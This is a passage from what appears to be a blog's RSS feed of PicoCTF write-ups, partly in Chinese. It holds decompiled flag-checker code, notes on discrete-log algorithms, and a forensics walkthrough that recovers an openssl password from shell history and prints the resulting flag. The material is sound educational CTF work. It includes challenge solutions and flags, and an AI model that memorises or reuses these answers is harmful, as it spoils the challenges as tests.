 unsigned __int8 v91; // [rsp+17h] [rbp-1F1h]
 unsigned __int8 v92; // [rsp+18h] [rbp-1F0h]
 unsigned __int8 v93; // [rsp+19h] [rbp-1EFh]
 unsigned __int8 v94; // [rsp+1Ah] [rbp-1EEh]
 unsigned __int8 v95; // [rsp+1Bh] [rbp-1EDh]
 unsigned __int8 v96; // [rsp+1Ch] [rbp-1ECh]
 char v97; // [rsp+1Dh] [rbp-1EBh]
 char *v98; // [rsp+20h] [rbp-1E8h]
 unsigned __int8 v99; // [rsp+2Ah] [rbp-1DEh]
 char v100; // [rsp+50h] [rbp-1B8h]
 char v101; // [rsp+52h] [rbp-1B6h]
 char v102; // [rsp+54h] [rbp-1B4h]
 char v103; // [rsp+56h] [rbp-1B2h]
 char v104; // [rsp+58h] [rbp-1B0h]
 char v105; // [rsp+5Ah] [rbp-1AEh]
 char v106; // [rsp+5Ch] [rbp-1ACh]
 char v107; // [rsp+5Eh] [rbp-1AAh]
 __int128 v108; // [rsp+60h] [rbp-1A8h]
 char ptr[64]; // [rsp+70h] [rbp-198h] BYREF
 __int128 v110; // [rsp+B0h] [rbp-158h] BYREF
 char v111; // [rsp+C0h] [rbp-148h] BYREF
 char v112[15]; // [rsp+150h] [rbp-B8h] BYREF
 __int128 v113; // [rsp+160h] [rbp-A8h]
 __int128 v115[4]; // [rsp+180h] [rbp-88h] BYREF
 char v116; // [rsp+1C0h] [rbp-48h] BYREF
 unsigned __int64 v117; // [rsp+1C8h] [rbp-40h]

 v117 = __readfsqword(0x28u);
 puts(&amp;#34;I heard you wanted to bargain for a flag... whatcha got?&amp;#34;);
 __asm { vmovdqa xmm0, cs:xmmword_21A0 }
 v4 = &amp;amp;v110;
 v5 = -104;
 v6 = 50;
 v7 = 108;
 v8 = 28;
 __asm { vmovdqa [rsp+208h+var_158], xmm0 }
 v9 = 4;
 do
 {
 if ( (v9 &amp;amp; 3) == 0 )
 {
 v10 = byte_20A0[v6];
 v6 = byte_20A0[v7];
 v7 = byte_20A0[v8];
 v8 = byte_20A0[v5];
 v5 = byte_2080[v9 &amp;gt;&amp;gt; 2] ^ v10;
 }
 v5 ^= *v4;
 ++v9;
 v4 = (v4 + 4);
 v6 ^= *(v4 - 3);
 v7 ^= *(v4 - 2);
 v8 ^= *(v4 - 1);
 *(v4 + 12) = v5;
 *(v4 + 13) = v6;
 *(v4 + 14) = v7;
 *(v4 + 15) = v8;
 }
 while ( v9 != 44 );
 __asm
 {
 vmovdqa xmm0, cs:xmmword_21B0
 vmovdqa [rsp+208h+var_A8], xmm0
 }
 fread(ptr, 1uLL, 0x40uLL, stdin);
 __asm
 {
 vmovdqa xmm0, cs:xmmword_21C0
 vmovdqa [rsp+208h+var_88], xmm0
 vmovdqa xmm0, cs:xmmword_21D0
 }
 v108 = v110;
 __asm
 {
 vmovdqa [rsp+208h+var_78], xmm0
 vmovdqa xmm0, cs:xmmword_21E0
 vmovdqa [rsp+208h+var_68], xmm0
 vmovdqa xmm0, cs:xmmword_21F0
 vmovdqa [rsp+208h+var_58], xmm0
 }
 v100 = v112[0];
 v101 = v112[2];
 v102 = v112[4];
 v103 = v112[6];
 v104 = v112[8];
 v105 = v112[10];
 v106 = v112[12];
 v107 = v112[14];
 v98 = v115;
 v16 = 16;
 do
 {
 if ( v16 == 16 )
 {
 v20 = &amp;amp;v111;
 __asm { vmovdqa xmm4, [rsp+208h+var_A8] }
 LOBYTE(v87) = byte_20A0[(v113 ^ v108)];
 __asm { vpextrb rax, xmm4, 4 }
 LOBYTE(v86) = byte_20A0[(BYTE4(v108) ^ _RAX)];
 v94 = byte_20A0[BYTE8(v113) ^ BYTE8(v108)];
 __asm { vpextrb rax, xmm4, 0Ch }
 v93 = byte_20A0[(BYTE12(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 1 }
 v25 = byte_20A0[(BYTE1(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 5 }
 v85 = byte_20A0[(BYTE5(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 9 }
 v84 = byte_20A0[(BYTE9(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 0Dh }
 v92 = byte_20A0[(BYTE13(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 2 }
 LOBYTE(v30) = byte_20A0[(BYTE2(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 6 }
 v32 = byte_20A0[(BYTE6(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 0Ah }
 v91 = byte_20A0[(BYTE10(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 0Eh }
 v96 = v32;
 v88 = v25;
 v90 = byte_20A0[(BYTE14(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 3 }
 v36 = byte_20A0[(BYTE3(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 7 }
 v95 = v36;
 v38 = byte_20A0[(BYTE7(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 0Bh }
 v40 = byte_20A0[(BYTE11(v108) ^ _RAX)];
 __asm { vpextrb rax, xmm4, 0Fh }
 v89 = byte_20A0[(HIBYTE(v108) ^ _RAX)];
 do
 {
 v42 = v91 ^ v89 ^ v87 ^ v85;
 v99 = v87 ^ v89;
 v43 = v90 ^ v95 ^ v86 ^ v84;
 v97 = v30 ^ v38 ^ v94 ^ v92;
 v44 = v40 ^ v96 ^ v93 ^ v88;
 v45 = ((2 * (v86 ^ v95)) ^ (27 * ((v86 ^ v95) &amp;gt;&amp;gt; 7)) ^ v95 ^ v43 ^ v20[7]);
 v46 = v20[10] ^ v97 ^ v30 ^ (27 * ((v30 ^ v38) &amp;gt;&amp;gt; 7)) ^ (2 * (v30 ^ v38));
 v47 = v20[11] ^ v97 ^ v38 ^ (2 * (v38 ^ v94)) ^ (27 * ((v38 ^ v94) &amp;gt;&amp;gt; 7));
 v48 = v88 ^ v44 ^ v20[13] ^ (2 * (v88 ^ v96)) ^ (27 * ((v88 ^ v96) &amp;gt;&amp;gt; 7));
 v49 = v96 ^ v44 ^ v20[14] ^ (27 * ((v40 ^ v96) &amp;gt;&amp;gt; 7)) ^ (2 * (v40 ^ v96));
 v50 = v44 ^ v20[15] ^ v40 ^ (2 * (v40 ^ v93)) ^ (27 * ((v40 ^ v93) &amp;gt;&amp;gt; 7));
 LOBYTE(v87) = byte_20A0[((2 * (v87 ^ v85)) ^ (27 * ((v87 ^ v85) &amp;gt;&amp;gt; 7)) ^ v42 ^ *v20 ^ v87)];
 LOBYTE(v86) = byte_20A0[((2 * (v86 ^ v84)) ^ (27 * ((v86 ^ v84) &amp;gt;&amp;gt; 7)) ^ v86 ^ v43 ^ v20[4])];
 v94 = byte_20A0[((2 * (v94 ^ v92)) ^ (27 * ((v94 ^ v92) &amp;gt;&amp;gt; 7)) ^ v94 ^ v97 ^ v20[8])];
 v93 = byte_20A0[((27 * ((v93 ^ v88) &amp;gt;&amp;gt; 7)) ^ (2 * (v93 ^ v88)) ^ v93 ^ v20[12] ^ v44)];
 v88 = byte_20A0[((2 * (v85 ^ v91)) ^ (27 * ((v85 ^ v91) &amp;gt;&amp;gt; 7)) ^ v85 ^ v42 ^ v20[1])];
 v85 = byte_20A0[((27 * ((v84 ^ v90) &amp;gt;&amp;gt; 7)) ^ (2 * (v84 ^ v90)) ^ v84 ^ v43 ^ v20[5])];
 v84 = byte_20A0[((27 * ((v30 ^ v92) &amp;gt;&amp;gt; 7)) ^ (2 * (v30 ^ v92)) ^ v20[9] ^ v97 ^ v92)];
 v92 = byte_20A0[v48];
 v51 = v91 ^ v42 ^ v20[2];
 v20 += 16;
 v30 = byte_20A0[((2 * (v91 ^ v89)) ^ (27 * ((v91 ^ v89) &amp;gt;&amp;gt; 7)) ^ v51)];
 v96 = byte_20A0[((27 * ((v90 ^ v95) &amp;gt;&amp;gt; 7)) ^ (2 * (v90 ^ v95)) ^ v43 ^ *(v20 - 10) ^ v90)];
 v91 = byte_20A0[v46];
 v90 = byte_20A0[v49];
 v40 = byte_20A0[v47];
 v38 = byte_20A0[v45];
 v95 = byte_20A0[((27 * (v99 &amp;gt;&amp;gt; 7)) ^ (2 * v99) ^ v89 ^ v42 ^ *(v20 - 13))];
 v89 = byte_20A0[v50];
 }
 while ( v112 != v20 );
 LOBYTE(v30) = v105 ^ v30;
 LOBYTE(v87) = v100 ^ v87;
 _R15D = v30;
 __asm { vmovd xmm5, r15d }
 v54 = v86;
 LOBYTE(v86) = v103 ^ v90;
 _R9D = (v101 ^ v91);
 _R10D = (v102 ^ v54);
 _EDX = (v107 ^ v96);
 _R13D = (v104 ^ v94);
 __asm
 {
 vmovd xmm4, edx
 vmovd xmm7, r9d
 vpinsrb xmm5, xmm5, ebx, 1
 vmovd xmm3, r10d
 }
 v63 = 15LL;
 _ESI = (v106 ^ v93);
 __asm
 {
 vmovd xmm1, r13d
 vmovd xmm0, [rsp+208h+var_1F8]
 vmovd xmm6, [rsp+208h+var_1FC]
 vpinsrb xmm7, xmm7, [rsp+208h+var_1FD], 1
 vpinsrb xmm0, xmm0, eax, 1
 vpinsrb xmm1, xmm1, r11d, 1
 vpunpcklwd xmm0, xmm0, xmm7
 }
 v72 = HIBYTE(v113);
 __asm
 {
 vpinsrb xmm3, xmm3, [rsp+208h+var_1FE], 1
 vpinsrb xmm6, xmm6, [rsp+208h+var_1F4], 1
 vpunpcklwd xmm1, xmm1, xmm5
 vpunpcklwd xmm3, xmm3, xmm6
 vmovd xmm2, esi
 vpunpckldq xmm0, xmm0, xmm3
 vpinsrb xmm2, xmm2, r8d, 1
 vpinsrb xmm4, xmm4, ecx, 1
 vpunpcklwd xmm2, xmm2, xmm4
 vpunpckldq xmm1, xmm1, xmm2
 vpunpcklqdq xmm0, xmm0, xmm1
 vmovdqa [rsp+208h+var_98], xmm0
 }
 if ( HIBYTE(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE14(v113);
 HIBYTE(v113) = 0;
 v63 = 14LL;
 if ( BYTE14(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE13(v113);
 BYTE14(v113) = 0;
 v63 = 13LL;
 if ( BYTE13(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE12(v113);
 BYTE13(v113) = 0;
 v63 = 12LL;
 if ( BYTE12(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE11(v113);
 BYTE12(v113) = 0;
 v63 = 11LL;
 if ( BYTE11(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE10(v113);
 BYTE11(v113) = 0;
 v63 = 10LL;
 if ( BYTE10(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE9(v113);
 BYTE10(v113) = 0;
 v63 = 9LL;
 if ( BYTE9(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE8(v113);
 BYTE9(v113) = 0;
 v63 = 8LL;
 if ( BYTE8(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE7(v113);
 BYTE8(v113) = 0;
 v63 = 7LL;
 if ( BYTE7(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE6(v113);
 BYTE7(v113) = 0;
 v63 = 6LL;
 if ( BYTE6(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE5(v113);
 BYTE6(v113) = 0;
 v63 = 5LL;
 if ( BYTE5(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE4(v113);
 BYTE5(v113) = 0;
 v63 = 4LL;
 if ( BYTE4(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE3(v113);
 BYTE4(v113) = 0;
 v63 = 3LL;
 if ( BYTE3(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE2(v113);
 BYTE3(v113) = 0;
 v63 = 2LL;
 if ( BYTE2(v113) != 0xFF )
 goto LABEL_14;
 v72 = BYTE1(v113);
 BYTE2(v113) = 0;
 v63 = 1LL;
 if ( BYTE1(v113) == 0xFF &amp;amp;&amp;amp; (v72 = v113, BYTE1(v113) = 0, v63 = 0LL, v113 == 0xFF) )
 {
 LOBYTE(v113) = 0;
 v16 = 0;
 }
 else
 {
LABEL_14:
 *(&amp;amp;v113 + v63) = v72 + 1;
 v16 = 0;
 }
 }
 v17 = v16++;
 *v98++ ^= *(&amp;amp;v115[-1] + v17);
 }
 while ( &amp;amp;v116 != v98 );
 v18 = memcmp(v115, ptr, 0x40uLL);
 if ( v18 )
 {
 v18 = 1;
 puts(&amp;#34;Nope, come back later&amp;#34;);
 }
 else
 {
 puts(&amp;#34;Yep, that&amp;#39;s it!&amp;#34;);
 }
 return v18;
}
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>PicoCTF - notepad</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---notepad/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/web/picoctf---notepad/</guid><description>&lt;h1 id="picoctf---notepad">
 PicoCTF - notepad
 &lt;a class="anchor" href="#picoctf---notepad">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://hackmd.io/@shaoeChen/BkApyHhgf?type=view">Flask實作_基礎_03_簡述url_for與route&lt;/a>
&lt;a href="https://tedboy.github.io/flask/generated/werkzeug.url_fix.html">werkzeug.url_fix&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;h2 id="exploit">
 Exploit
 &lt;a class="anchor" href="#exploit">#&lt;/a>
&lt;/h2>
&lt;h2 id="reference">
 Reference
 &lt;a class="anchor" href="#reference">#&lt;/a>
&lt;/h2></description></item><item><title>PicoCTF - NSA Backdoor</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---nsa-backdoor/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/crypto/rsa/picoctf---nsa-backdoor/</guid><description>&lt;h1 id="picoctf---nsa-backdoor">
 PicoCTF - NSA Backdoor
 &lt;a class="anchor" href="#picoctf---nsa-backdoor">#&lt;/a>
&lt;/h1>
&lt;h6 id="tags-picoctf-ctf-crypto">
 tags: &lt;code>PicoCTF&lt;/code> &lt;code>CTF&lt;/code> &lt;code>Crypto&lt;/code>
 &lt;a class="anchor" href="#tags-picoctf-ctf-crypto">#&lt;/a>
&lt;/h6>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://blog.csdn.net/ACdreamers/article/details/8579511">Baby Step Giant Step - BSGS&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>用来解决如下方程最小正整數解的
$A^x\equiv B(mod\ C)$，其中$0\le x\lt C$
如果$A\ge C, B\ge C$，那麼我們可以先取模，即$A% = C, B% = C$，所以在這裡我們只討論$0\le A, B\lt C$的情況。
普通的BSGS的步驟是這樣的：&lt;/p>
&lt;ol>
&lt;li>首先確定$x$的下限是$0$，上限是$C$，我們令$M=\lceil C\rceil$&lt;/li>
&lt;li>把$A^0~A^M\ mod\ C$的值存到一个Hash表裡面&lt;/li>
&lt;li>把$(A^M)^0~(A^M)^M\ mod\ C$的值一一枚舉出來，每枚舉一個就在Hash表裡面尋找是否有一個$val$值滿足$val \cdot (A^M)^i\ mod\ C=B$，如果有則找到答案，否則繼續&lt;/li>
&lt;li>最終答案就是$i\cdot M+val$的值對應的原來$A$的冪
上面是普通Baby Step Giant Step的步驟，比較簡單，只適用為素數的情況。如果為合數呢？&lt;/li>
&lt;/ol>&lt;/blockquote>
&lt;p>拓展的過程詳見全文&lt;/p>
&lt;hr>
&lt;p>&lt;a href="https://blog.csdn.net/oampamp1/article/details/104061969">離散對數問題 - pohlig-hellman算法講解&lt;/a>&lt;/p>
&lt;blockquote>
&lt;ol>
&lt;li>
&lt;p>需要注意的是，pohlig-hellman算法的覆雜度在一般情況下比BSGS高！
因此，使用pohlig-hellman的場合只能是較為特殊的情況，即:$p$是質數，且$p-1$包含的質因子較少&amp;amp;較小。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>和BSGS算法一樣，pohlig-hellman算法也是用於解決離散對數問題（也有很多文獻提到是解決橢圓曲線之類的）。即給定$a,b,p$,求 $a^x \equiv b(mod\ p)$。&lt;/p></description></item><item><title>PicoCTF - Operation Oni</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---operation-oni/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---operation-oni/</guid><description>&lt;h1 id="picoctf---operation-oni">
 PicoCTF - Operation Oni
 &lt;a class="anchor" href="#picoctf---operation-oni">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.techrepublic.com/article/how-to-view-your-ssh-keys-in-linux-macos-and-windows/">How to View Your SSH Keys in Linux, macOS and Windows&lt;/a>&lt;/p>
&lt;p>&lt;a href="https://docs.pingcode.com/ask/16621.html">ISO和IMG有哪些區別&lt;/a>&lt;/p>
&lt;blockquote>
&lt;h3 id="iso和img的區別">
 ISO和IMG的區別
 &lt;a class="anchor" href="#iso%e5%92%8cimg%e7%9a%84%e5%8d%80%e5%88%a5">#&lt;/a>
&lt;/h3>
&lt;p>ISO和IMG都是操作系統鏡像文件的擴展名，它們的主要區別在以下幾個方面：&lt;/p>
&lt;ol>
&lt;li>來源不同
ISO文件通常來自光盤鏡像，例如Windows安裝光盤的ISO鏡像文件。而IMG文件可以來自多種渠道，例如從移動設備制造商下載的Android操作系統鏡像文件，或者是從虛擬機軟件中制作的虛擬機磁盤鏡像文件。&lt;/li>
&lt;li>文件格式不同
ISO文件使用ISO 9660標準格式，而IMG文件可以使用多種格式，例如RAW、VMDK、VDI等。&lt;/li>
&lt;li>兼容性不同
ISO文件在各種操作系統和軟件中都有良好的兼容性，而IMG文件在一些操作系統或軟件中可能存在兼容性問題。&lt;/li>
&lt;li>使用範圍不同
ISO文件主要用於制作光盤或者USB啟動盤，用於安裝操作系統或者救援系統等。而IMG文件主要用於移動設備或者虛擬機等環境下的操作系統安裝或備份。
總之，ISO和IMG都是操作系統鏡像文件的擴展名，雖然它們在一些方面有類似之處，但在來源、文件格式、兼容性和使用範圍等方面存在差異，應根據具體的需求來選擇使用哪種格式。&lt;/li>
&lt;/ol>&lt;/blockquote>
&lt;h2 id="description">
 Description
 &lt;a class="anchor" href="#description">#&lt;/a>
&lt;/h2>
&lt;p>Download this disk image, find the key and log into the remote machine. Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.&lt;/p></description></item><item><title>PicoCTF - Operation Orchid</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---operation-orchid/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/misc/disk/picoctf---operation-orchid/</guid><description>&lt;h1 id="picoctf---operation-orchid">
 PicoCTF - Operation Orchid
 &lt;a class="anchor" href="#picoctf---operation-orchid">#&lt;/a>
&lt;/h1>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題過於簡單&lt;/p>
&lt;h2 id="exploit---forensics--openssl">
 Exploit - Forensics / Openssl
 &lt;a class="anchor" href="#exploit---forensics--openssl">#&lt;/a>
&lt;/h2>
&lt;ol>
&lt;li>
&lt;p>Find Encryption Flag File(Autopsy)
可以在/root中找到，然後.ash_history的command紀錄中知道加密的password phrase
&lt;img src="https://hackmd.io/_uploads/rJdlBhLgp.png" alt="" />&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>touch flag.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nano flag.txt 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apk get nano
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apk --help
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>apk add nano
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>nano flag.txt 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>openssl
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>openssl aes256 -salt -in flag.txt -out flag.txt.enc -k unbreakablepassword1234567
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>shred -u flag.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ls -al
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>halt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>Script&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ openssl aes-256-cbc -in flag.txt.enc -d
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>enter aes-256-cbc decryption password:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>*** WARNING : deprecated key derivation used.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Using -iter or -pbkdf2 would be better.
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>bad decrypt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>140342062343488:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:crypto/evp/evp_enc.c:612:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>picoCTF&lt;span style="color:#f92672">{&lt;/span>h4un71ng_p457_5113beab&lt;span style="color:#f92672">}&lt;/span>%
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ol></description></item><item><title>PicoCTF - OTP Implementation</title><link>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---otp-implementation/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/practice/picoctf/reverse/picoctf---otp-implementation/</guid><description>&lt;h1 id="picoctf---otp-implementation">
 PicoCTF - OTP Implementation
 &lt;a class="anchor" href="#picoctf---otp-implementation">#&lt;/a>
&lt;/h1>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler IDA Main Function&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-cpp" data-lang="cpp">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">int&lt;/span> &lt;span style="color:#66d9ef">__cdecl&lt;/span> &lt;span style="color:#a6e22e">main&lt;/span>(&lt;span style="color:#66d9ef">int&lt;/span> argc, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>argv, &lt;span style="color:#66d9ef">const&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> &lt;span style="color:#f92672">**&lt;/span>envp)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">char&lt;/span> v4; &lt;span style="color:#75715e">// al
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> v5; &lt;span style="color:#75715e">// dl
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> v6; &lt;span style="color:#75715e">// eax
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> i; &lt;span style="color:#75715e">// [rsp+18h] [rbp-E8h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">int&lt;/span> j; &lt;span style="color:#75715e">// [rsp+1Ch] [rbp-E4h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> input_key[&lt;span style="color:#ae81ff">112&lt;/span>]; &lt;span style="color:#75715e">// [rsp+20h] [rbp-E0h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">char&lt;/span> tmp_key[&lt;span style="color:#ae81ff">104&lt;/span>]; &lt;span style="color:#75715e">// [rsp+90h] [rbp-70h] BYREF
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#66d9ef">unsigned&lt;/span> &lt;span style="color:#66d9ef">__int64&lt;/span> v11; &lt;span style="color:#75715e">// [rsp+F8h] [rbp-8h]
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v11 &lt;span style="color:#f92672">=&lt;/span> __readfsqword(&lt;span style="color:#ae81ff">0x28u&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( argc &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span> )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> strncpy(input_key, argv[&lt;span style="color:#ae81ff">1&lt;/span>], &lt;span style="color:#ae81ff">0x64uLL&lt;/span>);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> input_key[&lt;span style="color:#ae81ff">100&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> ( i &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span>; valid_char(input_key[i]); &lt;span style="color:#f92672">++&lt;/span>i )&lt;span style="color:#75715e">// 確認字元是否在[0-9|a-f]之間
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> ( i )
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v4 &lt;span style="color:#f92672">=&lt;/span> jumble(input_key[i]);
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v5 &lt;span style="color:#f92672">=&lt;/span> tmp_key[i &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> v6 &lt;span style="color:#f92672">=&lt;/span> ((tmp_key[i &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>] &lt;span style="color:#f92672">+&lt;/span> v4) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">31&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">28&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_key[i] &lt;span style="color:#f92672">=&lt;/span> ((v6 &lt;span style="color:#f92672">+&lt;/span> v5) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xF&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> v6;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> tmp_key[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> jumble(input_key[&lt;span style="color:#ae81ff">0&lt;/span>]) &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">16&lt;/span>;
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
